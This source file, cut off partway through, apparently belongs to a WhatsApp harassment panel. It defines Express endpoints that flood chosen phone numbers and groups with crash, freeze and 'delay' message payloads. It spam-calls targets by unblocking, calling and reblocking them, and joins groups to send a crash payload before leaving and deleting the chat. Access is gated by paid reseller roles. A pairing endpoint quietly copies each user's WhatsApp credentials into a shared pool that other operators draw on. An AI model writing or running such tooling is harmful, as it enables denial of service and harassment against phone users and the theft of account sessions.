const crypto = require('crypto');
const express = require('express');
const { 
  activeConnections,
  mess,
  GCquizzzz,
  CrashNotif,
  prepareAuthFolders,
  connectSession,
  startUserSessions,
  disconnectAllActiveConnections,
  invisIOS,
  delay,
  crashclick,
  Freze,
  blank,
  spam,
  buldo,
  jmk,
  isVipOrOwner,
  getVipSessionPath,
  prepareVipSessionFolders,
  connectVipSession,
  startVipSessions,
  getActiveVipConnections,
  isVipSession,
  getRandomVipConnection,
  checkActiveSessionInFolder
} = require('../services/whatsappService');
const { loadDatabase, saveDatabase } = require('../services/databaseService');
const { ROLE_COOLDOWNS, MAX_QUANTITIES } = require('../utils/constants');
const { logger } = require('../utils/logger');
const { activeKeys } = require('../middleware/authMiddleware');
const { spamCooldown } = require('../utils/globals');
const path = require('path');
const fs = require('fs');

// Import WhatsApp modules
const { 
  makeWASocket, 
  useMultiFileAuthState, 
  DisconnectReason, 
  fetchLatestBaileysVersion 
} = require("@bellachu/baileys");
const pino = require('pino');

const router = express.Router();

// Tambahkan import di bagian atas
const { addActivityLog } = require('../services/activityLogService');


// Group UI status endpoint: cek sender user + ambil daftar group dari sender aktif
router.get("/groupStatus", async (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, hasSender: false, groups: [], message: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ valid: false, hasSender: false, groups: [], message: "User not found" });

  const userSessions = getUserActiveSessions(user.username);
  if (userSessions.length === 0) {
    return res.json({
      valid: true,
      hasSender: false,
      sender: null,
      groups: [],
      message: "Sender belum aktif. Pairing sender terlebih dahulu."
    });
  }

  const usable = userSessions.find(s => s.sock) || userSessions[0];
  const sock = usable.sock;

  try {
    const joinedGroups = await sock.groupFetchAllParticipating();
    const groups = Object.values(joinedGroups || {}).map(g => ({
      id: g.id,
      subject: g.subject || "Unknown Group",
      desc: g.desc || "",
      moderator: g.moderator || null,
      participants: Array.isArray(g.participants) ? g.participants.length : 0,
      creation: g.creation || null
    })).sort((a, b) => String(a.subject).localeCompare(String(b.subject)));

    return res.json({
      valid: true,
      hasSender: true,
      sender: {
        sessionName: usable.sessionName,
        type: usable.type || "Unknown",
        isActive: true,
        moderator: user.username
      },
      groups,
      message: groups.length > 0 ? "Sender aktif dan group ditemukan." : "Sender aktif, tetapi belum ada group."
    });
  } catch (err) {
    logger.error(`[❌ GROUP STATUS] ${err.message}`);
    return res.json({
      valid: false,
      hasSender: true,
      sender: {
        sessionName: usable.sessionName,
        type: usable.type || "Unknown",
        isActive: true,
        moderator: user.username
      },
      groups: [],
      message: "Gagal membaca daftar group dari sender."
    });
  }
});

// Join group endpoint: khusus sender milik user, lalu baca ulang metadata group
router.get("/joinGroup", async (req, res) => {
  const { key, linkGroup } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, success: false, message: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ valid: false, success: false, message: "User not found" });

  const input = String(linkGroup || "").trim();
  const match = input.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{20,30})/);
  if (!match) {
    return res.status(400).json({ valid: false, success: false, message: "Format link group tidak valid." });
  }

  const inviteCode = match[1];
  const userSessions = getUserActiveSessions(user.username);
  if (userSessions.length === 0) {
    return res.json({ valid: false, success: false, message: "No sender connected. Pairing sender user terlebih dahulu." });
  }

  // Tidak memakai global sender. Semua percobaan hanya dari sender milik username login.
  for (const session of userSessions) {
    const sock = session.sock;
    if (!sock) continue;

    try {
      const groupJid = await sock.groupAcceptInvite(inviteCode);
      await sleep(1500);

      let metadata = null;
      try {
        metadata = await sock.groupMetadata(groupJid);
      } catch (_) {}

      addActivityLog(user.username, "Join Group", {
        groupJid,
        groupName: metadata?.subject || "Unknown Group",
        sessionUsed: session.sessionName,
        success: true
      });

      return res.json({
        valid: true,
        success: true,
        sender: session.sessionName,
        group: {
          id: groupJid,
          subject: metadata?.subject || "Unknown Group",
          participants: Array.isArray(metadata?.participants) ? metadata.participants.length : 0
        },
        message: "Sender user berhasil join group dan metadata group terbaca."
      });
    } catch (err) {
      const msg = String(err?.message || err || "");
      logger.warn(`[⚠️ JOIN GROUP] Session ${session.sessionName} gagal: ${msg}`);

      // Jika sender sudah menjadi anggota, tetap baca daftar group supaya UI langsung dapat group-nya.
      try {
        const all = await sock.groupFetchAllParticipating();
        const found = Object.values(all || {}).find(g => String(g?.inviteCode || "") === inviteCode);
        if (found?.id) {
          return res.json({
            valid: true,
            success: true,
            sender: session.sessionName,
            group: {
              id: found.id,
              subject: found.subject || "Unknown Group",
              participants: Array.isArray(found.participants) ? found.participants.length : 0
            },
            message: "Sender user sudah berada di group dan metadata group terbaca."
          });
        }
      } catch (_) {}
    }
  }

  addActivityLog(user.username, "Failed Join Group", { inviteCode, success: false });
  return res.json({ valid: false, success: false, message: "Gagal join group dengan semua sender user yang aktif." });
});



// Backward-compatible alias: join lewat link saja, lalu UI membaca ulang list group.
// Tidak auto-kirim. Pengiriman dilakukan terpisah lewat /raidgroup setelah user pilih group dari list.
router.get("/raidgroupLink", async (req, res) => {
  req.url = req.url.replace('/raidgroupLink', '/joinGroup');
  return router.handle(req, res);
});

// Raidgroup endpoint: hanya untuk sender milik user, group yang memang sudah joined, dan pilihan bug delay
router.get("/raidgroup", async (req, res) => {
  const { key, groupJid, bug } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, success: false, message: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ valid: false, success: false, message: "User not found" });

  const selectedBug = String(bug || "group").toLowerCase().trim();
  if (selectedBug !== "group") {
    return res.status(400).json({ valid: false, success: false, message: "Pilihan bug hanya group." });
  }

  if (!groupJid || !String(groupJid).endsWith("@g.us")) {
    return res.status(400).json({ valid: false, success: false, message: "Group JID tidak valid." });
  }

  const userSessions = getUserActiveSessions(user.username);
  if (userSessions.length === 0) {
    return res.json({ valid: false, success: false, message: "Sender belum aktif. Pairing sender terlebih dahulu." });
  }

  for (const session of userSessions) {
    const sock = session.sock;
    if (!sock) continue;

    try {
      const joinedGroups = await sock.groupFetchAllParticipating();
      const group = joinedGroups ? joinedGroups[groupJid] : null;
      if (!group) continue;

      await sock.sendMessage(groupJid, {
        text: `Delay check from ${user.username}`
      });

      addActivityLog(user.username, "Raidgroup Delay", {
        groupJid,
        groupName: group.subject || "Unknown Group",
        bug: selectedBug,
        sessionUsed: session.sessionName,
        success: true
      });

      return res.json({
        valid: true,
        success: true,
        bug: selectedBug,
        groupJid,
        groupName: group.subject || "Unknown Group",
        sender: session.sessionName,
        message: "Delay berhasil dikirim ke group."
      });
    } catch (err) {
      logger.warn(`[⚠️ RAIDGROUP] Session ${session.sessionName} gagal: ${err.message}`);
    }
  }

  addActivityLog(user.username, "Failed Raidgroup Delay", {
    groupJid,
    bug: selectedBug,
    error: "Group not found in user sender list"
  });

  return res.json({
    valid: false,
    success: false,
    message: "Group tidak ditemukan pada sender user. Pastikan sender sudah join group tersebut."
  });
});

// Group Bug endpoint - Hanya untuk RESELLER dan Moderator (Single Response)
router.get("/groupBug", async (req, res) => {
  const { key, linkGroup } = req.query;

  // 1. Autentikasi dan Otorisasi
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  // [MODIFIKASI] Menambahkan 'high moderator'
  if (!["reseller", "moderator", "high moderator", "admin", "owner", "dev"].includes(user.role)) {
    return res.status(403).json({ valid: false, message: "Access denied. RESELLER, Moderator, or High Moderator role required." });
  }

  // 2. Validasi Parameter (hanya linkGroup yang diperiksa)
  if (!linkGroup) return res.status(400).json({ valid: false, message: "Group link is required" });

  // Ekstrak kode undangan dari link grup
  const match = linkGroup.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) return res.status(400).json({ valid: false, message: "Invalid group link format" });
  const inviteCode = match[1];

  // 3. Cek ketersediaan private session
  const userSessions = getUserActiveSessions(user.username);
   
  if (userSessions.length === 0) {
    return res.json({ 
      valid: false, 
      message: "Private sender unavailable. Please add a sender first." 
    });
  }

  // Pilih session acak dari milik pengguna
  const randomSession = userSessions[Math.floor(Math.random() * userSessions.length)];
  const sock = randomSession.sock;
  const sessionName = randomSession.sessionName;

  // 4. Jalankan seluruh proses dan tunggu hingga selesai sebelum merespons
  try {
    const result = await new Promise((resolve, reject) => {
      // Gunakan setImmediate agar tidak memblokir event loop, tapi tetap tunggu hasilnya
      setImmediate(async () => {
        try {
          logger.info(`[📤 GROUP BUG] Starting process with session ${sessionName} for group ${inviteCode}`);

          let finalResult = {
            success: false,
            canSendMessage: false,
            groupInfo: null,
            error: null
          };

          // 4.1. Bergabung dengan grup
          let groupJid;
          try {
            groupJid = await sock.groupAcceptInvite(inviteCode);
            logger.info(`[✅ GROUP BUG] Successfully joined group: ${groupJid}`);
          } catch (err) {
            logger.error(`[❌ GROUP BUG] Failed to join group: ${err.message}`);
            finalResult.error = `Failed to join group: ${err.message}`;
            return resolve(finalResult);
          }

          // Tunggu sebentar untuk memastikan koneksi stabil
          await sleep(3000);

          // 4.2. Ambil metadata grup
          let groupMetadata;
          try {
            groupMetadata = await sock.groupMetadata(groupJid);
            logger.info(`[✅ GROUP BUG] Retrieved group metadata`);
          } catch (err) {
            logger.error(`[❌ GROUP BUG] Failed to get group metadata: ${err.message}`);
            // Lanjutkan meskipun gagal ambil metadata
          }

          // 4.3. Coba kirim pesan ke grup
          try {
            await sock.sendMessage(groupJid, { text: "Halo" });
            finalResult.canSendMessage = true;
            logger.info(`[✅ GROUP BUG] Successfully sent message to group`);
          } catch (err) {
            logger.error(`[❌ GROUP BUG] Failed to send message to group: ${err.message}`);
            logger.info(`[ℹ️ GROUP BUG] Group might have chat disabled`);
          }

          // 4.4. Kirim kombinasi bug yang sudah di-hardcode jika pesan berhasil dikirim
          if (finalResult.canSendMessage) {
            try {
              logger.info(`[📤 GROUP BUG] Sending hardcoded bug combination to group`);
              await GbCrash(sock, groupJid);
              await sock.sendMessage(groupJid, { text: "Eh" });
              logger.info(`[✅ GROUP BUG] Successfully sent bug combination to group`);
            } catch (err) {
              logger.error(`[❌ GROUP BUG] Failed to send bug to group: ${err.message}`);
            }
          }

          // 4.5. Keluar dari grup
          try {
            await sock.groupLeave(groupJid);
            logger.info(`[✅ GROUP BUG] Successfully left group: ${groupJid}`);
          } catch (err) {
            logger.error(`[❌ GROUP BUG] Failed to leave group: ${err.message}`);
          }

          // 4.6. Hapus chat grup dari WhatsApp
          try {
            await sock.chatModify({
              delete: true,
              lastMessages: [{
                key: {
                  remoteJid: groupJid,
                  fromMe: true,
                  id: "1"
                },
                messageTimestamp: Date.now()
              }]
            }, groupJid);
            logger.info(`[✅ GROUP BUG] Successfully deleted group chat`);
          } catch (err) {
            logger.error(`[❌ GROUP BUG] Failed to delete group chat: ${err.message}`);
          }

          // Siapkan respons akhir
          finalResult.success = true;
          if (groupMetadata) {
            finalResult.groupInfo = {
              id: groupMetadata.id,
              subject: groupMetadata.subject,
              desc: groupMetadata.desc,
              moderator: groupMetadata.moderator,
              creation: groupMetadata.creation,
              participants: groupMetadata.participants.length
            };
          }
           
          resolve(finalResult);

        } catch (error) {
          logger.error(`[❌ GROUP BUG ERROR] ${error.message}`);
          reject(error);
        }
      });
    });

    // 5. Kirim respons akhir HANYA SATU KALI setelah semua proses selesai
    res.json(result);
    
    // 6. Tambahkan activity log
    if (result.success) {
      addActivityLog(user.username, 'Group Bug Attack', {
        groupInviteCode: inviteCode,
        groupInfo: result.groupInfo,
        sessionUsed: sessionName,
        canSendMessage: result.canSendMessage
      });
    } else {
      addActivityLog(user.username, 'Failed Group Bug Attack', {
        groupInviteCode: inviteCode,
        error: result.error,
        sessionUsed: sessionName
      });
    }

  } catch (error) {
    logger.error(`[❌ GROUP BUG FATAL ERROR] ${error.message}`);
    res.status(500).json({ valid: false, message: "An internal server error occurred." });
    
    // Tambahkan activity log untuk error
    addActivityLog(user.username, 'Failed Group Bug Attack', {
      groupInviteCode: inviteCode,
      error: error.message,
      sessionUsed: sessionName
    });
  }
});

// Send bug to target
router.get("/sendBug", async (req, res) => {
  const { key, bug, senderType } = req.query;
  let { target } = req.query;
  target = (target || "").replace(/\D/g, ""); 
  logger.info(`[📤 BUG] Send bug to ${target} using key ${key} - Bug: ${bug} - SenderType: ${senderType || 'private'}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    logger.info("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    logger.info("[❌ BUG] User tidak ditemukan.");
    return res.json({ valid: false });
  }

  // Cek apakah user adalah RESELLER atau Moderator
  const userIsVipOrOwner = isVipOrOwner(user);

  // Validasi senderType
  const selectedSenderType = senderType || "private";
  
  // Role yang diizinkan untuk menggunakan global sender
  const allowedGlobalRoles = ["founder", "reseller", "moderator", "owner", "tk"];
  const canUseGlobalSender = allowedGlobalRoles.includes((user.role || "member").toLowerCase());
  
  // Jika memilih global sender tapi tidak memiliki izin
  if (selectedSenderType === "global" && !canUseGlobalSender) {
    logger.warn(`[❌ BUG] User ${user.username} mencoba menggunakan global sender tanpa izin`);
    return res.json({ 
      valid: false, 
      sended: false,
      message: "Global sender hanya untuk role: Founder, RESELLER, Moderator, Owner, High Moderator"
    });
  }

  // Role-based Cooldown
  const role = user.role || "member";
  const cooldownSeconds = ROLE_COOLDOWNS[role] || 60;

  if (!user.lastSend) user.lastSend = 0;

  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);
  if (diffSeconds < cooldownSeconds) {
    logger.info(`${user.username} Still Cooldown`);
    
    // Tambahkan activity log untuk cooldown
    addActivityLog(user.username, 'Bug Attack - Cooldown', {
      target, bugType: bug, senderType: selectedSenderType, remainingCooldown: cooldownSeconds - diffSeconds
    });
    
    return res.json({
      valid: true,
      sended: false,
      cooldown: true,
      wait: cooldownSeconds - diffSeconds,
    });
  }

  // Respon duluan
  user.lastSend = now;
  saveDatabase(db);
  logger.info(`${user.username} Trigger Cooldown`);

  res.json({
    valid: true,
    sended: true,
    cooldown: false,
    role,
    senderType: selectedSenderType
  });

  // Kirim bug di background
  setImmediate(async () => {
    try {
      let sock;
      let usedSessionId = "Unknown";

      // --- LOGIKA PEMILIHAN SENDER (SUPER GLOBAL HARVESTER) ---
      if (selectedSenderType === "global") {
        const superRoles = ["founder", "owner", "tk", "moderator", "reseller"];
        
        if (superRoles.includes(role.toLowerCase())) {
          // Panen semua session aktif di folder reseller & permenmd
          const globalPool = [
            ...Object.keys(getActiveVipConnections()).map(id => ({ id, sock: getActiveVipConnections()[id], type: 'RESELLER' })),
            ...getAllUserActiveSessions() // Fungsi harvester
          ];

          if (globalPool.length > 0) {
            const randomPick = globalPool[Math.floor(Math.random() * globalPool.length)];
            sock = randomPick.sock;
            usedSessionId = randomPick.id;
            logger.info(`[🚀 SUPER GLOBAL] Meminjam session ${usedSessionId} milik ${randomPick.moderator || 'System'}`);
          }
        } else {
          sock = getRandomVipConnection();
        }
      } else {
        sock = await checkActiveSessionInFolder(user.username, userIsVipOrOwner);
      }
      // -------------------------------------------------------

      if (!sock) {
        logger.warn(`[❌ BUG] Tidak ada session aktif tersedia.`);
        addActivityLog(user.username, 'Failed Bug Attack - No Session', { target, bugType: bug, senderType: selectedSenderType });
        return;
      }
       
      const targetJid = target + "@s.whatsapp.net";
      switch (bug) {
        case "ios":
          for (let i = 0; i < 50; i++) {
            await invisIOS(sock, targetJid);
            await sleep(1000);
          }
          break;
        case "delay":
          for (let i = 0; i < 65; i++) {
            await delay(sock, targetJid);
            await sleep(3000);
          }
          break;
        case "click":
          for (let i = 0; i < 15; i++) {
            await crashclick(sock, targetJid);
            await sleep(1000);
          }
          break;
        case "freze":
          for (let i = 0; i < 50; i++) {
            await Freze(sock, targetJid);
            await sleep(1000);
          }
          break;
        case "blank":
          for (let i = 0; i < 100; i++) {
            await blank(sock, targetJid);
            await sleep(1000);            
          }
          break;
        case "spam":
          for (let i = 0; i < 30; i++) {
            await spam(sock, targetJid);
            await sleep(1000);
          }
          break;
        case "buldo":
          for (let i = 0; i < 70; i++) {
            await buldo(sock, targetJid);
            await sleep(1000);
          }
          case "andro":
          for (let i = 0; i < 30; i++) {
            await invisIOS(sock, targetJid);
            await sleep(1000);
            await Freze(sock, targetJid);
            await sleep(1000);
            await crashclick(sock, targetJid);
            await sleep(1000);
          }
          break;
      }

      logger.info(`[✅ BUG] '${bug}' terkirim ke ${target} via ${usedSessionId}`);
      addActivityLog(user.username, 'Bug Attack', { target, bugType: bug, senderType: selectedSenderType, success: true, usedSession: usedSessionId });
      
    } catch (err) {
      logger.error(`[❌ BUG ERROR] ${err.message}`);
      addActivityLog(user.username, 'Failed Bug Attack', { target, bugType: bug, senderType: selectedSenderType, error: err.message });
    }
  });
});

// Spam call to target
router.get("/spamCall", async (req, res) => {
  const { key, target, qty } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  // [MODIFIKASI] Menambahkan 'high moderator'
  if (!user || !["partner", "partner1", "moderator", "owner", "reseller", "tk", "founder"].includes(user.role)) {
    return res.json({ valid: false, message: "Access denied" });
  }

  // Cek apakah user adalah RESELLER atau Moderator
  const userIsVipOrOwner = isVipOrOwner(user);

  const role = user.role || "member";
  const maxQty = MAX_QUANTITIES[role] || 5;
  const callQty = parseInt(qty) || 1;

  if (callQty > maxQty) {
    return res.json({
      valid: false,
      message: `Qty too high. Max allowed for your role (${role}) is ${maxQty}.`
    });
  }

  // Dapatkan session aktif
  let bizSessions = [];
   
  // Jika user RESELLER/Moderator, coba gunakan session RESELLER terlebih dahulu
  if (userIsVipOrOwner) {
    const vipConnections = getActiveVipConnections();
    for (const [sessionName, sock] of Object.entries(vipConnections)) {
      if (biz && biz[sessionName]) { // Pengecekan aman
        bizSessions.push({
          sessionName: sessionName,
          sock: sock,
          type: "Business",
          isVip: true
        });
      }
    }
  }
   
  // Jika tidak ada session RESELLER atau user bukan RESELLER/Moderator, gunakan session milik pengguna
  if (bizSessions.length === 0) {
    const userSessions = getUserActiveSessions(user.username);
    bizSessions = userSessions.filter(s => s.type === "Business");
  }
   
  if (bizSessions.length === 0) {
    return res.json({ valid: false, message: "No business session available" });
  }

  const jid = target.includes("@s.whatsapp.net") ? target : `${target}@s.whatsapp.net`;

  const now = Date.now();
  const cooldown = spamCooldown[user.username] || { count: 0, lastReset: 0 };

  if (now - cooldown.lastReset > 300_000) {
    cooldown.count = 0;
    cooldown.lastReset = now;
  }

  if (cooldown.count >= 5) {
    const remaining = 300 - Math.floor((now - cooldown.lastReset) / 1000);
    
    // Tambahkan activity log untuk cooldown
    addActivityLog(user.username, 'Spam Call - Cooldown', {
      target,
      quantity: callQty,
      remainingCooldown: remaining
    });
    
    return res.json({ valid: false, cooldown: true, message: `Cooldown: wait ${remaining}s` });
  }

  try {
    // Pilih session acak
    const randomSession = bizSessions[Math.floor(Math.random() * bizSessions.length)];
    const sock = randomSession.sock;
    const sessionName = randomSession.sessionName;
    
    // Unblock target terlebih dahulu
    await sock.updateBlockStatus(jid, "unblock");
    await sock.offerCall(jid, true);
    await sock.updateBlockStatus(jid, "block");
    logger.info(`[✅ FIRST SPAM CALL] to ${jid} from ${sessionName}`);

    cooldown.count++;
    spamCooldown[user.username] = cooldown;

    res.json({ valid: true, sended: true, total: callQty });
    
    // Tambahkan activity log untuk spam call
    addActivityLog(user.username, 'Spam Call', {
      target,
      quantity: callQty,
      sessionUsed: sessionName,
      success: true
    });

    for (let i = 1; i < callQty; i++) {
      setTimeout(async () => {
        try {
          // Pilih session acak
          const randomSession = bizSessions[Math.floor(Math.random() * bizSessions.length)];
          const sock = randomSession.sock;
           
          // Unblock target terlebih dahulu
          await sock.updateBlockStatus(jid, "unblock");
          await sock.offerCall(jid, true);
          await sock.updateBlockStatus(jid, "block");

          logger.info(`[✅ SPAM CALL] #${i + 1} to ${jid} from ${randomSession.sessionName}`);
        } catch (err) {
          logger.warn(`[❌ CALL #${i + 1} ERROR]`, err.message);
        }
      }, i * 10000);
    }
  } catch (err) {
    logger.warn("[❌ FIRST CALL ERROR]", err.message);
    
    // Tambahkan activity log untuk error
    addActivityLog(user.username, 'Failed Spam Call', {
      target,
      quantity: callQty,
      error: err.message
    });
    
    return res.json({ valid: false, message: "Call failed" });
  }
});

// Custom Bug endpoint - Hanya untuk RESELLER dan Moderator
router.get("/customBug", async (req, res) => {
  const { key, target, bug, qty, delay, senderType } = req.query;

  // 1. Autentikasi dan Otorisasi
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  // [MODIFIKASI] Menambahkan 'high moderator'
  if (!["reseller", "moderator", "owner", "tk", "founder"].includes(user.role)) {
    return res.status(403).json({ valid: false, message: "Access denied. RESELLER, Moderator, or High Moderator role required." });
  }

  // 2. Validasi Parameter
  const cleanTarget = (target || "").replace(/\D/g, "");
  if (!cleanTarget) return res.status(400).json({ valid: false, message: "Target is required" });
  if (!bug) return res.status(400).json({ valid: false, message: "Bug list is required" });
  if (!["global", "private"].includes(senderType)) return res.status(400).json({ valid: false, message: "Invalid senderType. Must be 'global' or 'private'." });

  const bugsToSend = bug.split(',').map(b => b.trim());
  const parsedQty = parseInt(qty) || 1;
  const parsedDelay = parseInt(delay) || 100; // Default delay 100ms jika tidak ditentukan

  // 3. Logika berdasarkan SenderType
  let sock, sessionName, maxQty, effectiveDelay;

  if (senderType === "global") {
    maxQty = 10;
    effectiveDelay = 500; // Abaikan delay user, gunakan 500ms
    sock = getRandomVipConnection();
     
    // Cek ketersediaan session global
    if (!sock) {
      return res.json({ valid: false, message: "Selected sender type (global) not available right now." });
    }
    sessionName = "RESELLER Session";
  } else { // private
    maxQty = 200;
    effectiveDelay = Math.max(parsedDelay, 10); // Delay minimal 10ms
    const userSessions = getUserActiveSessions(user.username);
     
    // Cek ketersediaan session private
    if (userSessions.length === 0) {
      return res.json({ valid: false, message: "Selected sender type (private) not available right now." });
    }
    const randomSession = userSessions[Math.floor(Math.random() * userSessions.length)];
    sock = randomSession.sock;
    sessionName = randomSession.sessionName;
  }

  // 4. Validasi Qty akhir
  if (parsedQty > maxQty) {
    return res.json({
      valid: false,
      message: `Quantity too high. Max allowed for sender type '${senderType}' is ${maxQty}.`
    });
  }

  // 5. Respon sukses segera
  res.json({
    valid: true,
    message: `Attack queued on ${cleanTarget} using ${senderType} sender.`,
    details: {
      target: cleanTarget,
      senderType: senderType,
      bugs: bugsToSend,
      qty: parsedQty,
      delay: effectiveDelay
    }
  });

  // 6. Eksekusi di background
  setImmediate(async () => {
    try {
      const targetJid = `${cleanTarget}@s.whatsapp.net`;
      logger.info(`[📤 CUSTOM BUG] Starting attack on ${targetJid} using ${sessionName} (${senderType})`);

      // Pemetaan nama bug ke fungsi (pastikan fungsi-fungsi ini diimpor jika dipanggil)
      const bugFunctions = {
        'crashNotificationVVIP': CrashNotif, // fallback contoh
        'stealthCrashVVIP': CrashNew,
        'gsIntX': StatusLove,
        'forceCloseMentalVVIP': NullBlank,
        'permenCall': CallLog,
        'invisibleSpam': BlackScreen
      };

      for (let i = 0; i < parsedQty; i++) {
        for (const bugName of bugsToSend) {
          const bugFunction = bugFunctions[bugName];
          if (bugFunction) {
            await bugFunction(sock, targetJid);
            await sleep(effectiveDelay);
          } else {
            logger.warn(`[⚠️ CUSTOM BUG] Unknown bug function: ${bugName}`);
          }
        }
      }
      logger.info(`[✅ CUSTOM BUG] Attack on ${targetJid} completed.`);
      
      // Tambahkan activity log untuk custom bug
      addActivityLog(user.username, 'Custom Bug Attack', {
        target: cleanTarget,
        senderType,
        bugs: bugsToSend,
        quantity: parsedQty,
        delay: effectiveDelay,
        sessionUsed: sessionName,
        success: true
      });
      
    } catch (err) {
      logger.error(`[❌ CUSTOM BUG ERROR] ${err.message}`);
      
      // Tambahkan activity log untuk error
      addActivityLog(user.username, 'Failed Custom Bug Attack', {
        target: cleanTarget,
        senderType,
        bugs: bugsToSend,
        quantity: parsedQty,
        error: err.message,
        sessionUsed: sessionName
      });
    }
  });
});

// Get active WhatsApp connections
router.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  const userIsVipOrOwner = isVipOrOwner(user);
   
  let privateConns = []; 
  let globalConns = [];  
   
  // [MODIFIKASI: BACA LANGSUNG DARI FOLDER RESELLER AGAR HARVESTER LANGSUNG MUNCUL]
  if (userIsVipOrOwner) {
    const vipDir = path.join(process.cwd(), 'reseller');
    if (fs.existsSync(vipDir)) {
      const vipFiles = fs.readdirSync(vipDir).filter(f => f.endsWith('.json'));
      vipFiles.forEach(file => {
        const sessionName = path.basename(file, '.json');
        const filePath = path.join(vipDir, file);
        
        globalConns.push({
          sessionName: sessionName,
          type: detectWATypeFromCreds(filePath),
          isActive: activeConnections[sessionName] ? true : false, // Online check
          isVip: true,
          moderator: "global"
        });
      });
    }
  }
   
  // Dapatkan session milik user
  const userConns = getUserActiveSessions(user.username);
   
  // PERBAIKAN: Hapus properti 'sock' untuk menghindari circular reference
  const safeUserConns = userConns.map(conn => {
    // Menggunakan destructuring untuk membuat objek baru tanpa properti 'sock'
    const { sock, ...safeConn } = conn; 
    return {
      ...safeConn,
      moderator: user.username // Menandakan ini adalah session milik user
    };
  });

  privateConns = [...safeUserConns];
    
  logger.info(user.username);
  return res.json({
    valid: true,
    connections: {
      private: privateConns,  // Session milik pengguna sendiri
      global: globalConns     // Session global (RESELLER)
    }
  });
});

// =========================================================================
// [🔥 UPDATE] GET PAIRING OTOMATIS MIRROR KE RESELLER & PRIVATE (1X REQUEST)
// =========================================================================
router.get("/getPairing", async (req, res) => {
  const { key, number } = req.query; // isGlobal dihilangkan, sekarang otomatis 2 folder
  const cleanNumber = number ? number.replace(/\D/g, '') : null;
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    logger.info("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false, message: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ valid: false, message: "User not found" });
  if (!cleanNumber) return res.status(400).json({ valid: false, message: "Number is required" });

  // 1. ZOMBIE KILLER - Putuskan koneksi yang menggantung agar tidak muter
  if (activeConnections[cleanNumber]) {
    logger.info(`[⚠️ PAIRING] Membersihkan sesi lama untuk ${cleanNumber}...`);
    try {
      await activeConnections[cleanNumber].logout();
      await activeConnections[cleanNumber].end();
    } catch (e) {}
    delete activeConnections[cleanNumber];
  }

  try {
    // 2. TENTUKAN PATH (KITA BUAT KEDUANYA SEKALIGUS)
    const privateDir = path.join(process.cwd(), 'permenmd', user.username, cleanNumber);
    const globalDir = path.join(process.cwd(), 'reseller', cleanNumber);
    
    // Hapus sisa folder lama jika ada agar fresh
    if (fs.existsSync(privateDir)) fs.rmSync(privateDir, { recursive: true, force: true });
    if (fs.existsSync(globalDir)) fs.rmSync(globalDir, { recursive: true, force: true });
    
    fs.mkdirSync(privateDir, { recursive: true });
    fs.mkdirSync(globalDir, { recursive: true });

    // Kita gunakan privateDir sebagai auth state utama saat pairing
    const { state, saveCreds } = await useMultiFileAuthState(privateDir);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      browser: ["Ubuntu", "Chrome", "120.0.0.0"], // Browser stabil
      defaultQueryTimeoutMs: undefined,
    });

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === "close") {
        const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
        if (!isLoggedOut) {
          logger.info(`🔄 Reconnecting ${cleanNumber}...`);
          await waiting(3000);
          // Panggil pairingWa (sudah dimodifikasi agar mirror juga)
          await pairingWa(cleanNumber, user.username, 1);
        } else {
          delete activeConnections[cleanNumber];
        }
      } else if (connection === "open") {
         activeConnections[cleanNumber] = sock;
         
         // 3. PROSES MIRRORING SAAT SUKSES LOGIN
         const sourceCreds = path.join(privateDir, 'creds.json');
         
         // Path file JSON database
         const privateCredsJSON = path.join(process.cwd(), 'permenmd', user.username, `${cleanNumber}.json`);
         const globalCredsJSON = path.join(process.cwd(), 'reseller', `${cleanNumber}.json`);
         
         try {
             // Beri waktu agar creds.json selesai terisi penuh oleh Baileys
             await waiting(3000);
             if (fs.existsSync(sourceCreds)) {
                 const data = fs.readFileSync(sourceCreds);
                 
                 // Simpan ke permenmd (Private)
                 fs.writeFileSync(privateCredsJSON, data);
                 
                 // Simpan ke RESELLER (Global)
                 fs.writeFileSync(globalCredsJSON, data);
                 
                 // Copy juga creds.json ke dalam subfolder RESELLER agar siap di-load ulang
                 fs.writeFileSync(path.join(globalDir, 'creds.json'), data);
                 
                 logger.info(`✅ Session ${cleanNumber} berhasil disimpan ke PRIVATE & GLOBAL secara otomatis.`);
             }
         } catch (e) {
